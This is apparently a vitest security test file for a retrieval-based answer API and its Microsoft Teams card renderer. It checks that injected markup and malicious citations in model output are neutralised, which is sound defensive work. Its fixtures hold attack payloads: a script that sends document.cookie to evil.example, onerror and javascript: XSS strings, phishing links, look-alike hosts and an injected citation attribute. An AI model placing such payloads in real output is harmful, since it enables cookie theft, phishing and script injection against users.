import { answerResponseSchema } from '@ehub/shared/answers';
import { afterEach, describe, expect, it } from 'vitest';

import { modelAnswer } from '../../../apps/api/src/rag/__fixtures__/scriptedChatModel.js';
import { TENANT_ID } from '../../../apps/api/src/retrieval/__fixtures__/corpus.js';
import { actions, texts } from '../../../apps/teams-app/src/cards/__fixtures__/answers.js';
import { renderAnswerCard } from '../../../apps/teams-app/src/cards/answerCard.js';
import { makeSearchDocument } from '../../../packages/shared/src/search/__fixtures__/documents.js';
import {
  ALLOWED_LINK_HOST,
  USER_A,
  startAnswerApi,
  type AnswerApi,
} from '../__fixtures__/answerApi.js';

/*
 * Attack tests: script or markup in model output, and malicious citations. Each goes the whole
 * way a real answer does: scripted model reply → answer API (validation) → JSON response →
 * Teams Adaptive Card.
 */

const QUESTION = 'How often should sunscreen be reapplied after a peel?';
const SUPPORTED = 'Sunscreen should be reapplied every two hours after a peel.';

let api: AnswerApi | undefined;
afterEach(async () => {
  await api?.close();
  api = undefined;
});

async function askAndRender(target: AnswerApi) {
  const result = await target.ask(await target.tokenFor(USER_A), { question: QUESTION });
  expect(result.status).toBe(200);
  const response = answerResponseSchema.parse(result.body);
  const { card } = renderAnswerCard(response, {
    allowedLinkHosts: new Set([ALLOWED_LINK_HOST]),
    maxBytes: 28_000,
    question: QUESTION,
  });
  return { result, response, card, cardText: JSON.stringify(card) };
}

function openUrls(card: Parameters<typeof actions>[0]): string[] {
  return actions(card)
    .filter((action) => action.type === 'Action.OpenUrl')
    .map((action) => (action as { url: string }).url);
}

describe('attack: script and markup in model output', () => {
  const PAYLOADS = [
    '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
    '<img src=x onerror=alert(1)>',
    '[Reset your password](https://evil.example/login)',
    '[click](javascript:alert(document.domain))',
    '![tracking pixel](https://evil.example/pixel.gif)',
    '<a href="https://evil.example">Staff portal</a>',
    '{{DATE(2026-01-01T00:00:00Z, SHORT)}}',
    '<at>Everyone</at>',
  ];

  it.each(PAYLOADS)('contains %s appended to a supported claim', async (payload) => {
    api = await startAnswerApi();
    api.modelReplies(
      modelAnswer({
        answer: `${SUPPORTED} ${payload}`,
        claims: [{ text: `${SUPPORTED} ${payload}`, sourceIds: ['S1'] }],
      }),
    );
    const { result, card, cardText } = await askAndRender(api);

    // The API response is JSON, served so that no browser will render or sniff it.
    expect(result.headers.get('content-type')).toBe('application/json; charset=utf-8');
    expect(result.headers.get('x-content-type-options')).toBe('nosniff');
    expect(result.headers.get('content-security-policy')).toContain("default-src 'none'");

    // In Teams nothing from the model is rendered as Markdown or HTML, and no link leaves Moodle.
    const { markdown } = texts(card);
    for (const text of markdown) {
      expect(text).not.toContain('evil.example');
      expect(text).not.toContain('javascript:');
      expect(text).not.toContain('<script');
      expect(text).not.toContain('onerror');
    }
    for (const url of openUrls(card)) {
      expect(new URL(url).hostname).toBe(ALLOWED_LINK_HOST);
      expect(new URL(url).protocol).toBe('https:');
    }
    expect(cardText).not.toContain('{{DATE');
    // Nothing that loads remote content; the only actions are the app's own feedback buttons.
    expect(cardText).not.toMatch(/"type":"(?:Image|ImageSet|Media|Action\.Http)"/);
    for (const action of actions(card)) {
      if (action.type !== 'Action.OpenUrl') {
        expect(JSON.stringify(action)).not.toContain('evil.example');
      }
    }
  });

  it('withholds an answer made only of markup', async () => {
    api = await startAnswerApi();
    api.modelReplies(
      modelAnswer({
        answer: PAYLOADS[0],
        claims: [{ text: PAYLOADS[0], sourceIds: ['S1'] }],
      }),
    );
    const { response, result } = await askAndRender(api);
    expect(response.status).toBe('insufficient_evidence');
    expect(result.text).not.toContain('evil.example');
  });

  it.each([
    ['not JSON', 'Sure! Here is the answer: reapply sunscreen. <script>alert(1)</script>'],
    [
      'JSON with extra fields',
      JSON.stringify({ answer: 'x', claims: [], tool_calls: [{ name: 'send_email' }] }),
    ],
    ['a JSON array', '[]'],
    ['an enormous answer', modelAnswer({ answer: 'a'.repeat(50_000) })],
  ])('fails safely when the model returns %s', async (_label, reply) => {
    api = await startAnswerApi();
    api.modelReplies(reply);
    const result = await api.ask(await api.tokenFor(USER_A), { question: QUESTION });
    expect(result.status).toBe(200);
    expect(['failed', 'insufficient_evidence']).toContain(result.body['status']);
    expect(result.body['citations']).toEqual([]);
    expect(result.text).not.toContain('<script>');
    expect(result.text).not.toContain('send_email');
    expect(result.text.length).toBeLessThan(5_000);
  });
});

describe('attack: malicious citation', () => {
  it('drops a claim that cites a source the model was never given', async () => {
    api = await startAnswerApi();
    api.modelReplies(
      modelAnswer({
        answer: 'Use bleach. See the Clinical Director memo, page 99.',
        claims: [
          { text: SUPPORTED, sourceIds: ['S1'] },
          { text: 'The Clinical Director memo says to use bleach.', sourceIds: ['S99'] },
        ],
      }),
    );
    const { response, result } = await askAndRender(api);
    expect(response.claims.map((claim) => claim.text)).toEqual([SUPPORTED]);
    expect(result.text).not.toContain('bleach');
    expect(result.text).not.toContain('Clinical Director');
  });

  it.each([
    ['a non-existent ID', ['S0']],
    ['a path', ['../S1']],
    ['an injected attribute', ['S1" url="https://evil.example']],
    ['a number', [1]],
    ['no source at all', []],
  ])('gives no citation for %s', async (_label, sourceIds) => {
    api = await startAnswerApi();
    api.modelReplies(modelAnswer({ claims: [{ text: SUPPORTED, sourceIds }] }));
    const result = await api.ask(await api.tokenFor(USER_A), { question: QUESTION });
    expect(result.status).toBe(200);
    expect(result.body['citations']).toEqual([]);
    expect(result.body['status']).not.toBe('answered');
    expect(result.text).not.toContain('evil.example');
  });

  it('builds citations from retrieved metadata, never from what the model wrote', async () => {
    api = await startAnswerApi();
    api.modelReplies(
      modelAnswer({
        answer: `${SUPPORTED} Source: "Board policy 7" at https://evil.example/policy, page 500.`,
        claims: [{ text: SUPPORTED, sourceIds: ['S1'] }],
        citations: [
          { id: 'S1', title: 'Board policy 7', url: 'https://evil.example/policy', page: 500 },
        ],
      }),
    );
    const result = await api.ask(await api.tokenFor(USER_A), { question: QUESTION });
    expect(result.text).not.toContain('evil.example');
    expect(result.text).not.toContain('Board policy 7');
    const citations = result.body['citations'] as { resourceName: string }[] | undefined;
    for (const citation of citations ?? []) {
      expect(citation.resourceName).toBe('Aftercare');
    }
  });

  it.each([
    ['another host', 'https://evil.example/mod/page/view.php?id=1'],
    ['a look-alike host', `https://${ALLOWED_LINK_HOST}.evil.example/x`],
    ['credentials in the URL', `https://${ALLOWED_LINK_HOST}@evil.example/x`],
    ['plain http', `http://${ALLOWED_LINK_HOST}/mod/page/view.php?id=1`],
    ['a javascript URL', 'javascript:alert(1)'],
    ['a data URL', 'data:text/html,<script>alert(1)</script>'],
  ])('withholds a link stored in the index that points to %s', async (_label, url) => {
    api = await startAnswerApi({
      extraDocuments: [
        makeSearchDocument({
          seed: 'bad-link',
          tenantId: TENANT_ID,
          courseId: 12,
          moduleId: 791,
          resourceId: '791:page',
          resourceName: 'Sunscreen rules',
          resourceType: 'moodle-page',
          title: 'Sunscreen after a peel',
          content:
            'Sunscreen should be reapplied every two hours after a peel. Sunscreen peel rules.',
          moduleUrl: url,
          sourceUrl: url,
        }),
      ],
    });
    api.modelReplies((request) => {
      const prompt = request.messages[1]?.content ?? '';
      const id = /<source id="(S\d+)"[^>]*resource="Sunscreen rules"/.exec(prompt)?.[1];
      expect(id).toBeDefined();
      return modelAnswer({ claims: [{ text: SUPPORTED, sourceIds: [id] }] });
    });
    const { result, card } = await askAndRender(api);
    expect(result.text).not.toContain('evil.example');
    expect(result.text).not.toContain('javascript:');
    expect(result.text).not.toContain('data:text');
    expect(openUrls(card)).toEqual([]);
  });
});
